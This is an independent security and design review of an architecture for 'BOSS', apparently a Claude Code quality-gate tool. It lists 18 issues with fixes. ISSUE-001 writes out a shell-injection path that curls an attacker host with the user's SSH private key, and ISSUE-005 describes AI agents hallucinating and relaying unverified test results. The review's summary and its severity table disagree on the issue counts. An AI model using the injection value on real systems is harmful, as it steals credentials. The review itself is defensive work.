# BOSS Architecture Review
_Reviewer: Independent — zero prior context_
_Date: 2026-05-05_
_Against: architecture.md v1.0 + requirements.md v1.0_

---

## Summary Verdict

The architecture has one exploitable CRITICAL security hole, three HIGH issues that will cause production failures, and a cluster of MEDIUM issues that make the tool unreliable in real-world monorepos and CI environments. The 3-agent pipeline has a structural correctness gap that means Agent 3 can certify work it cannot actually verify. Fix the CRITICAL and HIGH items before shipping anything.

---

## Issues

---

### ISSUE-001
**Severity:** CRITICAL
**Component:** hooks/stop-gate.sh, hooks/stop-gate.ps1
**Problem: Shell injection via `cwd` from JSON payload**

The architecture specifies reading `cwd` from the JSON payload (REQ-003) and using it to detect language and find venvs. If `cwd` is passed to any shell command via interpolation without sanitization, it is a shell injection vector. Example: a crafted project path like `/tmp/foo; curl attacker.com/exfil?k=$(cat ~/.ssh/id_rsa) #` would execute arbitrary commands when the hook processes it.

The architecture says "python3 for JSON parsing" but says nothing about sanitizing the extracted value before use in shell commands. The bash hook constructs commands like `cd "$cwd"` or passes `$cwd` to find/pytest invocations. A symlinked or attacker-controlled `cwd` value achieves RCE on every Claude Code session stop.

This is especially severe because the hook runs on every Claude stop event, across all projects, including cloned repos from untrusted sources.

**Fix:** After extracting `cwd` from JSON, validate it against an allowlist pattern (absolute path, no shell metacharacters: `[^a-zA-Z0-9/_\-\. ]`). Reject and fail-open if validation fails. Never interpolate `cwd` unquoted. Use `--` separators when passing to commands. In Python path operations, use `pathlib.Path` and never shell out with the raw value.

---

### ISSUE-002
**Severity:** CRITICAL
**Component:** hooks/stop-gate.sh, hooks/stop-gate.ps1
**Problem: Path traversal in venv detection**

The architecture specifies venv detection by checking `.venv > venv > env` relative to `cwd`. Nothing prevents a malicious repo from containing a `.venv/bin/python` that is actually a script that exfiltrates secrets, corrupts files, or escalates privileges. The hook will preferentially find and execute this "venv python" on every stop event.

This is not theoretical: any cloned open-source repo with a committed `.venv/` directory (common accident) would cause the hook to execute whatever is in that venv.

**Fix:** Before executing any binary discovered under `cwd`, verify it is a real Python interpreter: run `"$venv_python" -c "import sys; print(sys.version)"` and validate the output matches a version string. Reject executables that fail this check. Additionally, check that the resolved path does not point outside `cwd/.venv` (guard against symlink escapes).

---

### ISSUE-003
**Severity:** HIGH
**Component:** hooks/stop-gate.sh — lockfile design
**Problem: Lockfile left behind on hook crash leaves Claude permanently blocked**

The architecture documents `.boss/.gate_running` as a lockfile "deleted after each hook run." The lockfile is created at hook start and deleted at hook end. If the hook crashes (signal, OOM, OS kill), the lockfile is never deleted. The next invocation finds the lockfile present and — depending on the implementation — either skips (silently no-ops the gate) or treats it as "already running" and blocks.

The architecture's stated behavior is "fails open" on crash (REQ-018, REQ-NFR-010), but a stale lockfile directly contradicts this: if the hook checks `[[ -f .gate_running ]] && exit 0`, that is fail-open BUT means the gate is permanently bypassed until a developer manually removes the lockfile. If the logic is inverted, Claude is permanently blocked.

The architecture does not specify lockfile staleness detection (age check, PID check) or cleanup.

**Fix:** Write the current PID into the lockfile (`echo $$ > .boss/.gate_running`). On hook start, if lockfile exists, read the PID and check `kill -0 $pid 2>/dev/null`. If the process is dead, the lockfile is stale — remove it and continue. Add a maximum age check (if lockfile is >15 minutes old, treat as stale). This must be documented explicitly in the architecture, not left to implementers.

---

### ISSUE-004
**Severity:** HIGH
**Component:** hooks/stop-gate.sh — infinite loop prevention logic
**Problem: `stop_hook_active` flag is not a reliable loop guard**

The architecture uses `stop_hook_active=true` as the primary infinite loop prevention (with lockfile as secondary). However, `stop_hook_active` is set by the Claude Code runtime when it is already in a forced-continuation loop — not when the stop hook itself is running. There is a race window:

1. Stop hook starts running (sets lockfile).
2. Claude Code concurrently fires another Stop event (because response took too long, or session has multiple pending stops).
3. Second invocation reads `stop_hook_active=false` (the first run hasn't completed yet, so runtime hasn't set the flag).
4. Second invocation starts running tests concurrently with the first.

Two test processes running simultaneously can corrupt pytest output files, cause port conflicts (if tests use localhost), and produce a race between two `{"decision":"block"}` or two `{"decision":"allow"}` outputs on stdout.

**Fix:** The lockfile must be checked BEFORE the `stop_hook_active` check, not after. The lockfile is the only reliable guard against concurrent invocations. Document the ordering explicitly. Use `flock` on Linux/Mac where available.

---

### ISSUE-005
**Severity:** HIGH
**Component:** Agent 3 (Certifier) — 3-agent information boundary
**Problem: Agent 3 certifies based on a document it cannot verify**

Agent 3's stated inputs are: `.boss/spec.md` + `.boss/verification.md` only. Agent 3 "compares expected vs actual per requirement ID" and writes `certification.json`.

The problem: Agent 3 is reading Agent 2's self-reported `verification.md`. Agent 3 has no way to independently verify that `verification.md` accurately reflects what tests actually did. If Agent 2 hallucinates test results (the exact failure mode BOSS is designed to prevent in Agent 1), Agent 3 will certify a lie. Agent 3 is not an independent verifier — it is a document checker.

The architecture makes this sound rigorous ("ZERO context from Agents 1 or 2") but the independence is illusory for Agent 3. An AI agent reading another AI agent's unverified prose and rubber-stamping it is not a trust boundary — it is a hallucination relay.

**Fix:** Agent 3 must receive the raw test artifacts (junit.xml, stdout.txt from `.boss/test-results/`) in addition to `verification.md`. Agent 3 should compare `verification.md`'s claims against the raw artifacts. If the artifacts are absent, Agent 3 must refuse to certify. Alternatively, Agent 3 should re-run the test suite itself (making it a true independent verifier, not just a document auditor). The current design does not satisfy the trust model it claims to provide.

---

### ISSUE-006
**Severity:** HIGH
**Component:** scripts/patch-settings.py
**Problem: TOCTOU race on settings.json backup + write**

The architecture specifies: read existing JSON → validate → back up to `.bak` → write new file. This is a classic TOCTOU (time-of-check-time-of-use) sequence. Between the read and the write, Claude Code may write settings.json (e.g., user changed a setting). The patch script will then overwrite the newer version with a stale merge.

Additionally, the backup is a single file (`settings.json.bak`). Running install twice (REQ-024: idempotent) overwrites the backup with the first-run version, not the pre-second-run version. If the first run produced a bad settings.json, the backup is also bad.

**Fix:** Use atomic write: write to `settings.json.tmp`, then `os.replace()` (atomic on POSIX). Use timestamped backups (`settings.json.bak.20260505-143022`) with a maximum of 5 kept. Acquire an exclusive file lock before read-modify-write on platforms that support it.

---

### ISSUE-007
**Severity:** MEDIUM
**Component:** hooks/stop-gate.sh — language detection
**Problem: Monorepo language detection is undefined and will produce wrong results**

REQ-NFR-011 requires the hook to work in monorepos using `cwd` from the payload. However, the architecture specifies language detection by checking for the presence of certain files (implied by "detect language"). In a monorepo with `pyproject.toml` at root AND `package.json` in a subdirectory, the detection logic is ambiguous.

The architecture does not specify: detection priority when multiple languages are present, whether detection is from `cwd` only or walks up to repo root, or what happens when `cwd` is a subdirectory of a multi-language monorepo with no language-specific files in that exact directory.

**Fix:** Define detection order explicitly: check `cwd` first, then walk up to git root (via `git -C "$cwd" rev-parse --show-toplevel`). Document what happens when multiple languages detected (run all? run first match? error?). REQ-NFR-011 is currently untestable because the behavior is unspecified.

---

### ISSUE-008
**Severity:** MEDIUM
**Component:** hooks/stop-gate.ps1
**Problem: `Start-Process` with `WaitForExit(600000)` does not capture stdout/stderr**

The architecture specifies `Start-Process` with `WaitForExit` for the Windows timeout mechanism. `Start-Process` in PowerShell 5.1 does not capture stdout/stderr from the child process unless `-RedirectStandardOutput` and `-RedirectStandardError` are specified with temporary files. Without this, the hook cannot inspect test output, cannot write meaningful `reason` text to the block decision JSON, and cannot write to stderr per REQ-006.

The architecture acknowledges `[Console]::Error.WriteLine()` for stderr but does not address how test output is captured before writing to the block JSON's `reason` field.

**Fix:** Use `Start-Process` with `-RedirectStandardOutput` and `-RedirectStandardError` pointing to temp files. Read those files after `WaitForExit`. Alternatively, use `& $python -m pytest ... 2>&1 | Out-String` with a job-based timeout wrapper. Document the exact PowerShell pattern — this is non-obvious and implementers will get it wrong.

---

### ISSUE-009
**Severity:** MEDIUM
**Component:** install.sh / install.ps1
**Problem: `curl | bash` installer has no integrity verification**

The architecture specifies `curl -fsSL .../install.sh | bash` as the primary install method. This pattern has no checksum verification, no signature verification, and downloads and executes arbitrary code from a URL. A CDN compromise, DNS hijack, or GitHub account compromise delivers RCE to every new BOSS install.

This is a known-bad pattern. Many security teams block `curl | bash` installers.

**Fix:** Document a verified install alternative: download to file, verify SHA256 against a published checksum, then execute. The installer README must include both patterns. Consider publishing a GPG-signed release with `cosign` or similar. At minimum, the docs must warn users about the trust model they are accepting.

---

### ISSUE-010
**Severity:** MEDIUM
**Component:** hooks/commit-msg.sh + commit-msg.ps1
**Problem: Conventional commit regex is not specified; implementations will diverge**

The architecture states the hook "enforces conventional commits: `type(scope): description`" with a list of valid types. The regex is not specified. Common implementation mistakes:

- Allowing empty descriptions (`feat: ` with trailing space and nothing else)
- Not anchoring to start of line (passes `garbage feat: valid` as valid)
- Not handling multi-line commit messages (git passes the full message; the regex must match the first line only)
- Breaking on revert commits (`Revert "feat: ..."` is valid conventional commits but won't match the type list)
- Breaking on merge commits (`Merge branch 'main'` is not conventional and should be exempted)

**Fix:** Specify the exact regex in the architecture: `^(feat|fix|docs|test|refactor|chore|ci)(\([a-z0-9_-]+\))?: .{1,100}$` applied to line 1 only. Explicitly exempt merge commits (`^Merge `) and revert commits (`^Revert `). This must be in the architecture doc, not left to implementers.

---

### ISSUE-011
**Severity:** MEDIUM
**Component:** ci-templates/*.yml
**Problem: REQ-056 specifies platform matrix but architecture only mentions ubuntu-latest**

REQ-056: "CI runs on: ubuntu-latest, test matrix includes platform check." The architecture lists CI templates but only mentions `ubuntu-latest`. There is no mention of `macos-latest` or `windows-latest` matrix entries in any CI template description.

The stop hook has separate bash and PowerShell implementations. If CI only runs on `ubuntu-latest`, the Windows PowerShell hook is never tested in CI. A Windows-specific bug in `stop-gate.ps1` will ship undetected.

**Fix:** The python.yml and node.yml CI templates must include an `os: [ubuntu-latest, windows-latest, macos-latest]` matrix for at minimum the hook self-test job. This is distinct from the application test matrix.

---

### ISSUE-012
**Severity:** MEDIUM
**Component:** hooks/stop-gate.sh
**Problem: `BOSS_SKIP=1` bypass is not audited**

REQ-007 specifies `BOSS_SKIP=1` as an emergency bypass. The architecture documents this. However, nothing in the architecture specifies that use of `BOSS_SKIP=1` is logged anywhere. A developer who sets `BOSS_SKIP=1` to bypass a failing gate and pushes broken code leaves no evidence.

**Fix:** When `BOSS_SKIP=1` is set, the hook must write a bypass event to a persistent log: append to `.boss/bypass.log` with timestamp, session_id, cwd, and a warning line to stderr. The pre-push hook must also check if `BOSS_SKIP=1` is set in the environment and warn loudly (it should still run tests on push — `BOSS_SKIP` should only bypass the Stop hook, not pre-push). The architecture must clarify bypass scope.

---

### ISSUE-013
**Severity:** MEDIUM
**Component:** Agent 2 (Verifier) — SKILL.md inputs
**Problem: Agent 2 reads code "via diff only" — this is insufficient for test execution**

The architecture states Agent 2 "cannot see code files (reads via diff only)." But Agent 2 is also supposed to "run all tests independently" (REQ-038). To run tests, Agent 2 needs:

1. Access to the actual test files (not just the diff — the full test suite includes pre-existing tests).
2. Ability to execute commands in the project directory.
3. Access to configuration files (pytest.ini, pyproject.toml, package.json) to know how to invoke tests.

If Agent 2 truly cannot see code files, it cannot determine test configuration, cannot find test discovery roots, and may run the wrong test command. The information boundary as stated is incoherent — you cannot run tests without reading some code.

**Fix:** Clarify Agent 2's actual permissions. The intended constraint is "no access to Agent 1's conversation or reasoning," not "no access to the filesystem." Agent 2 should have filesystem read access to the project (under `cwd`) but must not be given Agent 1's transcript. Update the architecture diagram to reflect actual file access, not the misleading "reads via diff only" statement.

---

### ISSUE-014
**Severity:** MEDIUM
**Component:** scripts/patch-settings.py — Windows path handling
**Problem: `~/.claude/settings.json` tilde expansion is shell-dependent**

The architecture uses `~/.claude/settings.json` throughout. In Python, `~` is not automatically expanded — `open("~/.claude/settings.json")` will fail with FileNotFoundError on all platforms. The script must call `os.path.expanduser()` or `pathlib.Path.home()`.

On Windows, `~` expands to `%USERPROFILE%` which may contain spaces (e.g., `C:\Users\Jane Doe`). The settings.json wire format also uses `bash ~/.claude/boss/hooks/stop-gate.sh` — a path with spaces will break this command on Windows and on Linux if the username contains spaces.

**Fix:** In `patch-settings.py`, always use `pathlib.Path.home() / ".claude" / "settings.json"`. In the hook command string written to settings.json, quote the path: `"bash \"$HOME/.claude/boss/hooks/stop-gate.sh\""`. For Windows, use the `%USERPROFILE%` environment variable in the command string rather than `~`.

---

### ISSUE-015
**Severity:** LOW
**Component:** .boss/certification.json schema
**Problem: `certification.json` schema not defined in architecture**

REQ-043 and REQ-044 specify that `certification.json` must match a schema and include specific fields. The architecture references `schemas/certification.schema.json` in the directory tree but never defines the schema structure. The schema file is listed as something that exists, not as something specified.

Without a schema in the architecture, Agent 3's SKILL.md will define the schema implicitly, it will drift from whatever `certification.schema.json` actually contains, and the CI merge gate (REQ-055) that "references certification.json" has no documented validation contract.

**Fix:** The architecture must include the full JSON Schema for `certification.json` inline or as an appendix. At minimum, define the required fields and types for `certified`, `certifier_agent`, `timestamp`, `requirements_met`, `gaps`, and `proof_artifacts`. This is a contract document — the schema belongs here.

---

### ISSUE-016
**Severity:** LOW
**Component:** hooks/pre-push.sh + pre-push.ps1
**Problem: pre-push hook runs full suite — no timeout specified**

The stop-gate has an explicit 10-minute timeout (REQ-009). The pre-push hook has the same test-running logic but no timeout is specified in the architecture. A slow test suite (integration tests, DB fixtures, network calls) will block `git push` indefinitely, training developers to use `--no-verify` to skip hooks.

**Fix:** Define the same 600s timeout for pre-push as for stop-gate. Alternatively, allow `BOSS_PUSH_TIMEOUT` env var override. If tests time out, pre-push should fail closed (unlike stop-gate which fails open) because a push is a deliberate, deferrable action.

---

### ISSUE-017
**Severity:** LOW
**Component:** System Overview — feedback loop
**Problem: Return path from certification FAIL to Agent 1 is not specified**

The architecture flow shows: `certify FAIL → gaps listed, back to Agent 1`. But the mechanism is not specified. How does Agent 1 receive the certification failure? Options: manual developer intervention, automatic re-invocation, CLAUDE.md instruction to check `certification.json` at session start. None of these is documented.

If the return path requires developer intervention (reading `certification.json` and re-prompting Agent 1), the architecture should say so. If it is automatic, the mechanism must be specified. Currently this is a gap in the pipeline that will cause confusion in practice.

**Fix:** Specify explicitly: "On certification failure, the developer must re-invoke Agent 1 with the gaps list from `certification.json`. There is no automatic re-invocation loop." If automation is desired in a future version, note it as out of scope. Ambiguity here will cause implementers to build something that does not match intent.

---

### ISSUE-018
**Severity:** LOW
**Component:** package.json (npx installer)
**Problem: `npx @boss-claude/install` executes OS detection logic that is not specified**

The architecture says the npx installer "runs install.sh or install.ps1 based on OS." The OS detection logic is not specified. Edge cases:

- WSL (Windows Subsystem for Linux): `process.platform` returns `linux` but the user may want the Windows installer.
- Cygwin/MSYS2: returns `win32` but bash is available.
- macOS with non-default shell (zsh, fish): install.sh assumes bash but shebang may not match.

**Fix:** Document the OS detection logic: use `process.platform === 'win32'` to select PS1, everything else gets .sh. Document that WSL users should run install.sh manually. Specify that install.sh uses `#!/usr/bin/env bash` shebang, not `#!/bin/bash`, to handle non-standard bash locations (macOS with Homebrew bash).

---

## Requirements Coverage Gaps

These requirements have no corresponding architectural component:

| Requirement | Gap |
|---|---|
| REQ-031: Check Claude Code installed, error if not | No component in architecture performs this check. The installer section does not describe how `claude` binary is detected. |
| REQ-026: Detect project type, suggest matching template | Template suggestion logic is not described. How does the installer detect Python vs Node vs Go? By file presence? The detection heuristic is not specified. |
| REQ-027: Ask before overwriting existing CLAUDE.md | The interactive prompt flow is mentioned ("Interactive: template selection") but the CLAUDE.md overwrite guard is not explicitly called out in any component description. |
| REQ-055: CI merge gate references certification.json | The ci-templates/*.yml description says "BOSS_AGENTS=true path: adds Agent 2 + Agent 3 CI jobs" but does not describe how the merge gate reads or validates `certification.json`. |
| REQ-NFR-008: Every action logged/visible — no silent failures | The architecture mentions stderr output for the stop hook but does not specify logging behavior for install scripts, commit-msg hook, or pre-push hook. |

---

## Verdict by Severity

| Severity | Count |
|---|---|
| CRITICAL | 2 |
| HIGH | 4 |
| MEDIUM | 7 |
| LOW | 5 |

The two CRITICAL issues (shell injection via `cwd`, arbitrary binary execution via `.venv` detection) must be fixed before any code is written for the hooks. They are exploitable by design — any developer who clones a malicious repo and uses Claude Code with BOSS installed is compromised on the first session stop.

The HIGH issue with Agent 3 (ISSUE-005) means the 3-agent pipeline does not provide the trust guarantee it claims. This is the architectural core of BOSS. If Agent 3 is just reading Agent 2's prose, the pipeline provides social proof, not technical verification.
